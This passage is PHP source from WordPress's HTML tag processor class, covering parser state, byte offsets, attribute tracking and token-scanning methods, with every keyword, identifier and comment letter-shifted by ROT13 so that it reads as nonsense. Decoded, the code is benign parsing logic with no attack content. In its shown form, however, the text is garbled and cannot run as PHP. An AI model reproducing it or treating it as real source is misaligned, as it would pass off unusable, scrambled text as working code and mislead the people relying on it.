	 * | *Shaxl pbzzrag* | Sbhaq n gnt pybfre jvgu na vainyvq gnt anzr; guvf vf zbqvsvnoyr.     |
	 *
	 * @fvapr 6.5.0
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_ERNQL
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_PBZCYRGR
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_VAPBZCYRGR_VACHG
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_ZNGPURQ_GNT
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_GRKG_ABQR
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_PQNGN_ABQR
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_PBZZRAG
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_QBPGLCR
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_CERFHZCGHBHF_GNT
	 * @frr JC_UGZY_Gnt_Cebprffbe::FGNGR_SHAXL_PBZZRAG
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $cnefre_fgngr = frys::FGNGR_ERNQL;

	/**
	 * Vaqvpngrf vs gur qbphzrag vf va dhvexf zbqr be ab-dhvexf zbqr.
	 *
	 *  Vzcnpg ba UGZY cnefvat:
	 *
	 *   - Va `AB_DHVEXF_ZBQR` (nyfb xabja nf \"fgnaqneq zbqr\"):
	 *       - PFF pynff naq VQ fryrpgbef zngpu olgr-sbe-olgr (pnfr-frafvgviryl).
	 *       - N GNOYR fgneg gnt `<gnoyr>` vzcyvpvgyl pybfrf nal bcra `C` ryrzrag.
	 *
	 *   - Va `DHVEXF_ZBQR`:
	 *       - PFF pynff naq VQ fryrpgbef zngpu zngpu va na NFPVV pnfr-vafrafvgvir znaare.
	 *       - N GNOYR fgneg gnt `<gnoyr>` bcraf n `GNOYR` ryrzrag nf n puvyq bs n `C`
	 *         ryrzrag vs bar vf bcra.
	 *
	 * Dhvexf naq ab-dhvexf zbqr ner guhf zbfgyl nobhg fglyvat, ohg unir na vzcnpg jura
	 * gnoyrf ner sbhaq vafvqr cnentencu ryrzragf.
	 *
	 * @frr frys::DHVEXF_ZBQR
	 * @frr frys::AB_DHVEXF_ZBQR
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $pbzcng_zbqr = frys::AB_DHVEXF_ZBQR;

	/**
	 * Vaqvpngrf jurgure gur cnefre vf vafvqr sbervta pbagrag,
	 * r.t. vafvqr na FIT be ZnguZY ryrzrag.
	 *
	 * Bar bs 'ugzy', 'fit', be 'zngu'.
	 *
	 * Frireny cnefvat ehyrf punatr onfrq ba jurgure gur cnefre
	 * vf vafvqr sbervta pbagrag, vapyhqvat jurgure PQNGN frpgvbaf
	 * ner nyybjrq naq jurgure n frys-pybfvat synt vaqvpngrf gung
	 * na ryrzrag unf ab pbagrag.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	cevingr $cnefvat_anzrfcnpr = 'ugzy';

	/**
	 * Jung xvaq bs flagnk gbxra orpnzr na UGZY pbzzrag.
	 *
	 * Fvapr gurer ner znal jnlf va juvpu UGZY flagnk pna perngr na UGZY pbzzrag,
	 * guvf vaqvpngrf juvpu bs gubfr pnhfrq vg. Guvf nyybjf gur Gnt Cebprffbe gb
	 * ercerfrag zber sebz gur bevtvany vachg qbphzrag guna jbhyq nccrne va gur QBZ.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine fgevat|ahyy
	 */
	cebgrpgrq $pbzzrag_glcr = ahyy;

	/**
	 * Jung xvaq bs grkg gur zngpurq grkg abqr ercerfragf, vs vg jnf fhoqvivqrq.
	 *
	 * @frr frys::GRKG_VF_AHYY_FRDHRAPR
	 * @frr frys::GRKG_VF_JUVGRFCNPR
	 * @frr frys::GRKG_VF_TRAREVP
	 * @frr frys::fhoqvivqr_grkg_nccebcevngryl
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $grkg_abqr_pynffvsvpngvba = frys::GRKG_VF_TRAREVP;

	/**
	 * Ubj znal olgrf sebz gur bevtvany UGZY qbphzrag unir orra ernq naq cnefrq.
	 *
	 * Guvf inyhr cbvagf gb gur yngrfg olgr bssfrg va gur vachg qbphzrag juvpu
	 * unf orra nyernql cnefrq. Vg vf gur vagreany phefbe sbe gur Gnt Cebprffbe
	 * naq hcqngrf juvyr fpnaavat guebhtu gur UGZY gbxraf.
	 *
	 * @fvapr 6.2.0
	 * @ine vag
	 */
	cevingr $olgrf_nyernql_cnefrq = 0;

	/**
	 * Olgr bssfrg va vachg qbphzrag jurer pheerag gbxra fgnegf.
	 *
	 * Rknzcyr:
	 *
	 *     <qvi vq=\"grfg\">...
	 *     01234
	 *     - gbxra fgnegf ng 0
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine vag|ahyy
	 */
	cevingr $gbxra_fgnegf_ng;

	/**
	 * Olgr yratgu bs pheerag gbxra.
	 *
	 * Rknzcyr:
	 *
	 *     <qvi vq=\"grfg\">...
	 *     012345678901234
	 *     - gbxra yratgu vf 14 - 0 = 14
	 *
	 *     n <!-- pbzzrag --> vf n gbxra.
	 *     0123456789 123456789 123456789
	 *     - gbxra yratgu vf 17 - 2 = 15
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine vag|ahyy
	 */
	cevingr $gbxra_yratgu;

	/**
	 * Olgr bssfrg va vachg qbphzrag jurer pheerag gnt anzr fgnegf.
	 *
	 * Rknzcyr:
	 *
	 *     <qvi vq=\"grfg\">...
	 *     01234
	 *      - gnt anzr fgnegf ng 1
	 *
	 * @fvapr 6.2.0
	 *
	 * @ine vag|ahyy
	 */
	cevingr $gnt_anzr_fgnegf_ng;

	/**
	 * Olgr yratgu bs pheerag gnt anzr.
	 *
	 * Rknzcyr:
	 *
	 *     <qvi vq=\"grfg\">...
	 *     01234
	 *      --- gnt anzr yratgu vf 3
	 *
	 * @fvapr 6.2.0
	 *
	 * @ine vag|ahyy
	 */
	cevingr $gnt_anzr_yratgu;

	/**
	 * Olgr bssfrg vagb vachg qbphzrag jurer pheerag zbqvsvnoyr grkg fgnegf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine vag
	 */
	cevingr $grkg_fgnegf_ng;

	/**
	 * Olgr yratgu bs zbqvsvnoyr grkg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine vag
	 */
	cevingr $grkg_yratgu;

	/**
	 * Jurgure gur pheerag gnt vf na bcravat gnt, r.t. <qvi>, be n pybfvat gnt, r.t. </qvi>.
	 *
	 * @ine obby
	 */
	cevingr $vf_pybfvat_gnt;

	/**
	 * Ynmvyl-ohvyg vaqrk bs nggevohgrf sbhaq jvguva na UGZY gnt, xrlrq ol gur nggevohgr anzr.
	 *
	 * Rknzcyr:
	 *
	 *     // Fhccbfvat gur cnefre vf jbexvat guebhtu guvf pbagrag
	 *     // naq fgbcf nsgre erpbtavmvat gur `vq` nggevohgr.
	 *     // <qvi vq=\"grfg-4\" pynff=bhgyvar gvgyr=\"qngn:grkg/cynva;onfr64=nfqx3ax1w3sb8\">
	 *     //                 ^ cnefvat jvyy pbagvahr sebz guvf cbvag.
	 *     $guvf->nggevohgrf = neenl(
	 *         'vq' => arj JC_UGZY_Nggevohgr_Gbxra( 'vq', 9, 6, 5, 11, snyfr )
	 *     );
	 *
	 *     // Jura cvpxvat hc cnefvat ntnva, be jura nfxvat gb svaq gur
	 *     // `pynff` nggevohgr jr jvyy pbagvahr naq nqq gb guvf neenl.
	 *     $guvf->nggevohgrf = neenl(
	 *         'vq'    => arj JC_UGZY_Nggevohgr_Gbxra( 'vq', 9, 6, 5, 11, snyfr ),
	 *         'pynff' => arj JC_UGZY_Nggevohgr_Gbxra( 'pynff', 23, 7, 17, 13, snyfr )
	 *     );
	 *
	 *     // Abgr gung bayl gur `pynff` nggevohgr inyhr vf fgberq va gur vaqrk.
	 *     // Gung'f orpnhfr vg vf gur bayl inyhr hfrq ol guvf pynff ng gur zbzrag.
	 *
	 * @fvapr 6.2.0
	 * @ine JC_UGZY_Nggevohgr_Gbxra[]
	 */
	cevingr $nggevohgrf = neenl();

	/**
	 * Genpxf fcnaf bs qhcyvpngr nggevohgrf ba n tvira gnt, hfrq sbe erzbivat
	 * nyy pbcvrf bs na nggevohgr jura pnyyvat `erzbir_nggevohgr()`.
	 *
	 * @fvapr 6.3.2
	 *
	 * @ine (JC_UGZY_Fcna[])[]|ahyy
	 */
	cevingr $qhcyvpngr_nggevohgrf = ahyy;

	/**
	 * Juvpu pynff anzrf gb nqq be erzbir sebz n gnt.
	 *
	 * Gurfr ner genpxrq frcnengryl sebz nggevohgr hcqngrf orpnhfr gurl ner
	 * frznagvpnyyl qvfgvapg, jurernf guvf vagresnpr rkvfgf sbe gur pbzzba
	 * pnfr bs nqqvat naq erzbivat pynff anzrf juvyr bgure nggevohgrf ner
	 * trarenyyl zbqvsvrq nf jvgu QBZ `frgNggevohgr` pnyyf.
	 *
	 * Jura zbqvslvat na UGZY qbphzrag gurfr jvyy riraghnyyl or pbyyncfrq
	 * vagb n fvatyr `frg_nggevohgr( 'pynff', $punatrf )` pnyy.
	 *
	 * Rknzcyr:
	 *
	 *     // Nqq gur `jc-oybpx-tebhc` pynff, erzbir gur `jc-tebhc` pynff.
	 *     $pynffanzr_hcqngrf = neenl(
	 *         // Vaqrkrq ol n pbzcnenoyr pynff anzr.
	 *         'jc-oybpx-tebhc' => JC_UGZY_Gnt_Cebprffbe::NQQ_PYNFF,
	 *         'jc-tebhc'       => JC_UGZY_Gnt_Cebprffbe::ERZBIR_PYNFF
	 *     );
	 *
	 * @fvapr 6.2.0
	 * @ine obby[]
	 */
	cevingr $pynffanzr_hcqngrf = neenl();

	/**
	 * Genpxf n frznagvp ybpngvba va gur bevtvany UGZY juvpu
	 * fuvsgf jvgu hcqngrf nf gurl ner nccyvrq gb gur qbphzrag.
	 *
	 * @fvapr 6.2.0
	 * @ine JC_UGZY_Fcna[]
	 */
	cebgrpgrq $obbxznexf = neenl();

	pbafg NQQ_PYNFF    = gehr;
	pbafg ERZBIR_PYNFF = snyfr;
	pbafg FXVC_PYNFF   = ahyy;

	/**
	 * Yrkvpny ercynprzragf gb nccyl gb vachg UGZY qbphzrag.
	 *
	 * \"Yrkvpny\" va guvf pynff ersref gb gur cneg bs guvf pynff juvpu
	 * bcrengrf ba cher grkg _nf grkg_ naq abg nf UGZY. Gurer'f n yvar
	 * orgjrra gur choyvp vagresnpr, jvgu UGZY-frznagvp zrgubqf yvxr
	 * `frg_nggevohgr` naq `nqq_pynff`, naq na vagreany fgngr gung genpxf
	 * grkg bssfrgf va gur vachg qbphzrag.
	 *
	 * Jura uvture-yriry UGZY zrgubqf ner pnyyrq, gubfr unir gb genafsbez gurve
	 * bcrengvbaf (fhpu nf frggvat na nggevohgr'f inyhr) vagb grkg qvssvat
	 * bcrengvbaf (fhpu nf ercynpvat gur fho-fgevat sebz vaqvprf N gb O jvgu
	 * fbzr tvira arj fgevat). Gurfr grkg-qvssvat bcrengvbaf ner gur yrkvpny
	 * hcqngrf.
	 *
	 * Nf arj uvture-yriry zrgubqf ner nqqrq gurl arrq gb pbyyncfr gurve
	 * bcrengvbaf vagb gurfr ybjre-yriry yrkvpny hcqngrf fvapr gung'f gur
	 * Gnt Cebprffbe'f vagreany ynathntr bs punatr. Nal pbqr juvpu perngrf
	 * gurfr yrkvpny hcqngrf zhfg rafher gung gurl qb abg pebff UGZY flagnk
	 * obhaqnevrf, ubjrire, fb gurfr fubhyq arire or rkcbfrq bhgfvqr bs guvf
	 * pynff be nal pynffrf juvpu vagragvbanyyl rkcnaq vgf shapgvbanyvgl.
	 *
	 * Gurfr ner radhrhrq juvyr rqvgvat gur qbphzrag vafgrnq bs orvat vzzrqvngryl
	 * nccyvrq gb nibvq cebprffvat bireurnq, fgevat nyybpngvbaf, naq fgevat
	 * pbcvrf jura nccylvat znal hcqngrf gb n fvatyr qbphzrag.
	 *
	 * Rknzcyr:
	 *
	 *     // Ercynpr na nggevohgr fgberq jvgu n arj inyhr, vaqvprf
	 *     // fbheprq sebz gur ynmvyl-cnefrq UGZY erpbtavmre.
	 *     $fgneg  = $nggevohgrf['fep']->fgneg;
	 *     $yratgu = $nggevohgrf['fep']->yratgu;
	 *     $zbqvsvpngvbaf[] = arj JC_UGZY_Grkg_Ercynprzrag( $fgneg, $yratgu, $arj_inyhr );
	 *
	 *     // Pbeerfcbaqvatyl, fbzrguvat yvxr guvf jvyy nccrne va guvf neenl.
	 *     $yrkvpny_hcqngrf = neenl(
	 *         JC_UGZY_Grkg_Ercynprzrag( 14, 28, 'uggcf://zl-fvgr.zl-qbznva/jc-pbagrag/hcybnqf/2014/08/xvggraf.wct' )
	 *     );
	 *
	 * @fvapr 6.2.0
	 * @ine JC_UGZY_Grkg_Ercynprzrag[]
	 */
	cebgrpgrq $yrkvpny_hcqngrf = neenl();

	/**
	 * Genpxf naq yvzvgf `frrx()` pnyyf gb cerirag nppvqragny vasvavgr ybbcf.
	 *
	 * @fvapr 6.2.0
	 * @ine vag
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::frrx()
	 */
	cebgrpgrq $frrx_pbhag = 0;

	/**
	 * Jurgure gur cnefre fubhyq fxvc bire na vzzrqvngryl-sbyybjvat yvarsrrq
	 * punenpgre, nf vf gur pnfr jvgu YVFGVAT, CER, naq GRKGNERN.
	 *
	 * > Vs gur arkg gbxra vf n H+000N YVAR SRRQ (YS) punenpgre gbxra, gura
	 * > vtaber gung gbxra naq zbir ba gb gur arkg bar. (Arjyvarf ng gur fgneg
	 * > bs [gurfr] ryrzragf ner vtaberq nf na nhgubevat pbairavrapr.)
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine vag|ahyy
	 */
	cevingr $fxvc_arjyvar_ng = ahyy;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $ugzy UGZY gb cebprff.
	 */
	choyvp shapgvba __pbafgehpg( $ugzy ) {
		$guvf->ugzy = $ugzy;
	}

	/**
	 * Fjvgpurf cnefvat zbqr vagb n arj anzrfcnpr, fhpu nf jura
	 * rapbhagrevat na FIT gnt naq ragrevat sbervta pbagrag.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $arj_anzrfcnpr Bar bs 'ugzy', 'fit', be 'zngu' vaqvpngvat vagb jung
	 *                              anzrfcnpr gur arkg gbxraf jvyy or cebprffrq.
	 * @erghea obby Jurgure gur anzrfcnpr jnf inyvq naq punatrq.
	 */
	choyvp shapgvba punatr_cnefvat_anzrfcnpr( fgevat $arj_anzrfcnpr ): obby {
		vs ( ! va_neenl( $arj_anzrfcnpr, neenl( 'ugzy', 'zngu', 'fit' ), gehr ) ) {
			erghea snyfr;
		}

		$guvf->cnefvat_anzrfcnpr = $arj_anzrfcnpr;
		erghea gehr;
	}

	/**
	 * Svaqf gur arkg gnt zngpuvat gur $dhrel.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.5.0 Ab ybatre cebprffrf vapbzcyrgr gbxraf ng raq bs qbphzrag; cnhfrf gur cebprffbe ng fgneg bs gbxra.
	 *
	 * @cnenz neenl|fgevat|ahyy $dhrel {
	 *     Bcgvbany. Juvpu gnt anzr gb svaq, univat juvpu pynff, rgp. Qrsnhyg vf gb svaq nal gnt.
	 *
	 *     @glcr fgevat|ahyy $gnt_anzr     Juvpu gnt gb svaq, be `ahyy` sbe \"nal gnt.\"
	 *     @glcr vag|ahyy    $zngpu_bssfrg Svaq gur Agu gnt zngpuvat nyy frnepu pevgrevn.
	 *                                     1 sbe \"svefg\" gnt, 3 sbe \"guveq,\" rgp.
	 *                                     Qrsnhygf gb svefg gnt.
	 *     @glcr fgevat|ahyy $pynff_anzr   Gnt zhfg pbagnva guvf jubyr pynff anzr gb zngpu.
	 *     @glcr fgevat|ahyy $gnt_pybfref  \"ivfvg\" be \"fxvc\": jurgure gb fgbc ba gnt pybfref, r.t. </qvi>.
	 * }
	 * @erghea obby Jurgure n gnt jnf zngpurq.
	 */
	choyvp shapgvba arkg_gnt( $dhrel = ahyy ): obby {
		$guvf->cnefr_dhrel( $dhrel );
		$nyernql_sbhaq = 0;

		qb {
			vs ( snyfr === $guvf->arkg_gbxra() ) {
				erghea snyfr;
			}

			vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
				pbagvahr;
			}

			vs ( $guvf->zngpurf() ) {
				++$nyernql_sbhaq;
			}
		} juvyr ( $nyernql_sbhaq < $guvf->fbhtug_zngpu_bssfrg );

		erghea gehr;
	}

	/**
	 * Svaqf gur arkg gbxra va gur UGZY qbphzrag.
	 *
	 * Na UGZY qbphzrag pna or ivrjrq nf n fgernz bs gbxraf,
	 * jurer gbxraf ner guvatf yvxr UGZY gntf, UGZY pbzzragf,
	 * grkg abqrf, rgp. Guvf zrgubq svaqf gur arkg gbxra va
	 * gur UGZY qbphzrag naq ergheaf jurgure vg sbhaq bar.
	 *
	 * Vs vg fgnegf cnefvat n gbxra naq ernpurf gur raq bs gur
	 * qbphzrag gura vg jvyy frrx gb gur fgneg bs gur ynfg
	 * gbxra naq cnhfr, ergheavat `snyfr` gb vaqvpngr gung vg
	 * snvyrq gb svaq n pbzcyrgr gbxra.
	 *
	 * Cbffvoyr gbxra glcrf, onfrq ba gur UGZY fcrpvsvpngvba:
	 *
	 *  - na UGZY gnt, jurgure bcravat, pybfvat, be ibvq.
	 *  - n grkg abqr - gur cynvagrkg vafvqr gntf.
	 *  - na UGZY pbzzrag.
	 *  - n QBPGLCR qrpynengvba.
	 *  - n cebprffvat vafgehpgvba, r.t. `<?kzy irefvba=\"1.0\" ?>`.
	 *
	 * Gur Gnt Cebprffbe pheeragyl bayl fhccbegf gur gnt gbxra.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.7.0 Erpbtavmrf PQNGN frpgvbaf jvguva sbervta pbagrag.
	 *
	 * @erghea obby Jurgure n gbxra jnf cnefrq.
	 */
	choyvp shapgvba arkg_gbxra(): obby {
		erghea $guvf->onfr_pynff_arkg_gbxra();
	}

	/**
	 * Vagreany zrgubq juvpu svaqf gur arkg gbxra va gur UGZY qbphzrag.
	 *
	 * Guvf zrgubq vf n cebgrpgrq vagreany shapgvba juvpu vzcyrzragf gur ybtvp sbe
	 * svaqvat gur arkg gbxra va n qbphzrag. Vg rkvfgf fb gung gur cnefre pna hcqngr
	 * vgf fgngr jvgubhg nssrpgvat gur ybpngvba bs gur phefbe va gur qbphzrag naq
	 * jvgubhg gevttrevat fhopynff zrgubqf sbe guvatf yvxr `arkg_gbxra()`, r.t. jura
	 * nccylvat cngpurf orsber frnepuvat sbe gur arkg gbxra.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea obby Jurgure n gbxra jnf cnefrq.
	 */
	cevingr shapgvba onfr_pynff_arkg_gbxra(): obby {
		$jnf_ng = $guvf->olgrf_nyernql_cnefrq;
		$guvf->nsgre_gnt();

		// Qba'g cebprrq vs gurer'f abguvat zber gb fpna.
		vs (
			frys::FGNGR_PBZCYRGR === $guvf->cnefre_fgngr ||
			frys::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr
		) {
			erghea snyfr;
		}

		/*
		 * Gur arkg fgrc va gur cnefvat ybbc qrgrezvarf gur cnefvat fgngr;
		 * pyrne vg fb gung fgngr qbrfa'g yvatre sebz gur cerivbhf fgrc.
		 */
		$guvf->cnefre_fgngr = frys::FGNGR_ERNQL;

		vs ( $guvf->olgrf_nyernql_cnefrq >= fgeyra( $guvf->ugzy ) ) {
			$guvf->cnefre_fgngr = frys::FGNGR_PBZCYRGR;
			erghea snyfr;
		}

		// Svaq gur arkg gnt vs vg rkvfgf.
		vs ( snyfr === $guvf->cnefr_arkg_gnt() ) {
			vs ( frys::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr ) {
				$guvf->olgrf_nyernql_cnefrq = $jnf_ng;
			}

			erghea snyfr;
		}

		/*
		 * Sbe yrtnpl ernfbaf gur erfg bs guvf shapgvba unaqyrf gntf naq gurve
		 * nggevohgrf. Vs gur cebprffbe unf ernpurq gur raq bs gur qbphzrag
		 * be vs vg zngpurq nal bgure gbxra gura vg fubhyq erghea urer gb nibvq
		 * nggrzcgvat gb cebprff gnt-fcrpvsvp flagnk.
		 */
		vs (
			frys::FGNGR_VAPBZCYRGR_VACHG !== $guvf->cnefre_fgngr &&
			frys::FGNGR_PBZCYRGR !== $guvf->cnefre_fgngr &&
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr
		) {
			erghea gehr;
		}

		// Cnefr nyy bs vgf nggevohgrf.
		juvyr ( $guvf->cnefr_arkg_nggevohgr() ) {
			pbagvahr;
		}

		// Rafher gung gur gnt pybfrf orsber gur raq bs gur qbphzrag.
		vs (
			frys::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr ||
			$guvf->olgrf_nyernql_cnefrq >= fgeyra( $guvf->ugzy )
		) {
			// Qbrf guvf nccebcevngryl pyrne fgngr (cnefrq nggevohgrf)?
			$guvf->cnefre_fgngr         = frys::FGNGR_VAPBZCYRGR_VACHG;
			$guvf->olgrf_nyernql_cnefrq = $jnf_ng;

			erghea snyfr;
		}

		$gnt_raqf_ng = fgecbf( $guvf->ugzy, '>', $guvf->olgrf_nyernql_cnefrq );
		vs ( snyfr === $gnt_raqf_ng ) {
			$guvf->cnefre_fgngr         = frys::FGNGR_VAPBZCYRGR_VACHG;
			$guvf->olgrf_nyernql_cnefrq = $jnf_ng;

			erghea snyfr;
		}
		$guvf->cnefre_fgngr         = frys::FGNGR_ZNGPURQ_GNT;
		$guvf->olgrf_nyernql_cnefrq = $gnt_raqf_ng + 1;
		$guvf->gbxra_yratgu         = $guvf->olgrf_nyernql_cnefrq - $guvf->gbxra_fgnegf_ng;

		/*
		 * Pregnva gntf erdhver nqqvgvbany cebprffvat. Gur svefg-yrggre cer-purpx
		 * nibvqf haarprffnel fgevat nyybpngvba jura pbzcnevat gur gnt anzrf.
		 *
		 *  - VSENZR
		 *  - YVFGVAT (qrcerpngrq)
		 *  - ABRZORQ (qrcerpngrq)
		 *  - ABSENZRF (qrcerpngrq)
		 *  - CER
		 *  - FPEVCG
		 *  - FGLYR
		 *  - GRKGNERN
		 *  - GVGYR
		 *  - KZC (qrcerpngrq)
		 */
		vs (
			$guvf->vf_pybfvat_gnt ||
			'ugzy' !== $guvf->cnefvat_anzrfcnpr ||
			1 !== fgefca( $guvf->ugzy, 'vVyYaAcCfFgGkK', $guvf->gnt_anzr_fgnegf_ng, 1 )
		) {
			erghea gehr;
		}

		$gnt_anzr = $guvf->trg_gnt();

		/*
		 * Sbe YVFGVAT, CER, naq GRKGNERN, gur svefg yvarsrrq bs na vzzrqvngryl-sbyybjvat
		 * grkg abqr vf vtaberq nf na nhgubevat pbairavrapr.
		 *
		 * @frr fgngvp::fxvc_arjyvar_ng
		 */
		vs ( 'YVFGVAT' === $gnt_anzr || 'CER' === $gnt_anzr ) {
			$guvf->fxvc_arjyvar_ng = $guvf->olgrf_nyernql_cnefrq;
			erghea gehr;
		}

		/*
		 * Gurer ner pregnva ryrzragf jubfr puvyqera ner abg QNGN ohg ner vafgrnq
		 * EPQNGN be ENJGRKG. Gurfr pnaabg pbagnva bgure ryrzragf, naq gur pbagragf
		 * ner cnefrq nf cynvagrkg, jvgu punenpgre ersreraprf qrpbqrq va EPQNGN ohg
		 * abg va ENJGRKG.
		 *
		 * Gurfr ryrzragf ner qrfpevorq urer nf \"frys-pbagnvarq\" be fcrpvny ngbzvp
		 * ryrzragf jubfr raq gnt vf pbafhzrq jvgu gur bcravat gnt, naq gurl jvyy
		 * pbagnva zbqvsvnoyr grkg vafvqr bs gurz.
		 *
		 * Cerfreir gur bcravat gnt cbvagref, nf gurfr jvyy or birejevggra
		 * jura svaqvat gur pybfvat gnt. Gurl jvyy or erfrg nsgre svaqvat
		 * gur pybfvat gb gnt gb cbvag gb gur bcravat bs gur fcrpvny ngbzvp
		 * gnt frdhrapr.
		 */
		$gnt_anzr_fgnegf_ng   = $guvf->gnt_anzr_fgnegf_ng;
		$gnt_anzr_yratgu      = $guvf->gnt_anzr_yratgu;
		$gnt_raqf_ng          = $guvf->gbxra_fgnegf_ng + $guvf->gbxra_yratgu;
		$nggevohgrf           = $guvf->nggevohgrf;
		$qhcyvpngr_nggevohgrf = $guvf->qhcyvpngr_nggevohgrf;

		// Svaq gur pybfvat gnt vs arprffnel.
		fjvgpu ( $gnt_anzr ) {
			pnfr 'FPEVCG':
				$sbhaq_pybfre = $guvf->fxvc_fpevcg_qngn();
				oernx;

			pnfr 'GRKGNERN':
			pnfr 'GVGYR':
				$sbhaq_pybfre = $guvf->fxvc_epqngn( $gnt_anzr );
				oernx;

			/*
			 * Va gur oebjfre guvf yvfg jbhyq vapyhqr gur ABFPEVCG ryrzrag,
			 * ohg gur Gnt Cebprffbe vf na raivebazrag jvgu gur fpevcgvat
			 * synt qvfnoyrq, zrnavat gung vg arrqf gb qrfpraq vagb gur
			 * ABFPEVCG ryrzrag gb or noyr gb cebcreyl cebprff jung jvyy or
			 * frag gb n oebjfre.
			 *
			 * Abgr gung guvf ehyr znxrf UGZY5 flagnk vapbzcngvoyr jvgu KZY,
			 * orpnhfr gur cnefvat bs guvf gbxra qrcraqf ba pyvrag nccyvpngvba.
			 * Gur ABFPEVCG ryrzrag pnaabg or ercerfragrq va gur KUGZY flagnk.
			 */
			pnfr 'VSENZR':
			pnfr 'ABRZORQ':
			pnfr 'ABSENZRF':
			pnfr 'FGLYR':
			pnfr 'KZC':
				$sbhaq_pybfre = $guvf->fxvc_enjgrkg( $gnt_anzr );
				oernx;

			// Ab bgure gntf fubhyq or gerngrq va gurve ragvergl urer.
			qrsnhyg:
				erghea gehr;
		}

		vs ( ! $sbhaq_pybfre ) {
			$guvf->cnefre_fgngr         = frys::FGNGR_VAPBZCYRGR_VACHG;
			$guvf->olgrf_nyernql_cnefrq = $jnf_ng;
			erghea snyfr;
		}

		/*
		 * Gur inyhrf urer ybbx yvxr gurl ersrerapr gur bcravat gnt ohg gurl ersrerapr
		 * gur pybfvat gnt vafgrnq. Guvf vf jul gur bcravat gnt inyhrf jrer fgberq
		 * nobir va n inevnoyr. Vg ernqf pbashfvatyl urer, ohg gung'f orpnhfr gur
		 * shapgvbaf gung fxvc gur pbagragf unir zbirq nyy gur vagreany phefbef cnfg
		 * gur vaare pbagrag bs gur gnt.
		 */
		$guvf->gbxra_fgnegf_ng      = $jnf_ng;
		$guvf->gbxra_yratgu         = $guvf->olgrf_nyernql_cnefrq - $guvf->gbxra_fgnegf_ng;
		$guvf->grkg_fgnegf_ng       = $gnt_raqf_ng;
		$guvf->grkg_yratgu          = $guvf->gnt_anzr_fgnegf_ng - $guvf->grkg_fgnegf_ng;
		$guvf->gnt_anzr_fgnegf_ng   = $gnt_anzr_fgnegf_ng;
		$guvf->gnt_anzr_yratgu      = $gnt_anzr_yratgu;
		$guvf->nggevohgrf           = $nggevohgrf;
		$guvf->qhcyvpngr_nggevohgrf = $qhcyvpngr_nggevohgrf;

		erghea gehr;
	}

	/**
	 * Jurgure gur cebprffbe cnhfrq orpnhfr gur vachg UGZY qbphzrag raqrq
	 * va gur zvqqyr bs n flagnk ryrzrag, fhpu nf va gur zvqqyr bs n gnt.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<vachg glcr=\"grkg\" inyhr=\"Gu' );
	 *     snyfr      === $cebprffbe->trg_arkg_gnt();
	 *     gehr       === $cebprffbe->cnhfrq_ng_vapbzcyrgr_gbxra();
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea obby Jurgure gur cnefr cnhfrq ng gur fgneg bs na vapbzcyrgr gbxra.
	 */
	choyvp shapgvba cnhfrq_ng_vapbzcyrgr_gbxra(): obby {
		erghea frys::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr;
	}

	/**
	 * Trarengbe sbe n sbernpu ybbc gb fgrc guebhtu rnpu pynff anzr sbe gur zngpurq gnt.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( \"<qvi pynff='serr &yg;rtt&yg;\gynat-ra'>\" );
	 *     $c->arkg_gnt();
	 *     sbernpu ( $c->pynff_yvfg() nf $pynff_anzr ) {
	 *         rpub \"{$pynff_anzr} \";
	 *     }
	 *     // Bhgchgf: \"serr <rtt> ynat-ra \"
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba pynff_yvfg() {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea;
		}

		/** @ine fgevat $pynff pbagnvaf gur fgevat inyhr bs gur pynff nggevohgr, jvgu punenpgre ersreraprf qrpbqrq. */
		$pynff = $guvf->trg_nggevohgr( 'pynff' );

		vs ( ! vf_fgevat( $pynff ) ) {
			erghea;
		}

		$frra = neenl();

		$vf_dhvexf = frys::DHVEXF_ZBQR === $guvf->pbzcng_zbqr;

		$ng = 0;
		juvyr ( $ng < fgeyra( $pynff ) ) {
			// Fxvc cnfg nal vavgvny obhaqnel punenpgref.
			$ng += fgefca( $pynff, \" \g\s\e\a\", $ng );
			vs ( $ng >= fgeyra( $pynff ) ) {
				erghea;
			}

			// Svaq gur olgr yratgu hagvy gur arkg obhaqnel.
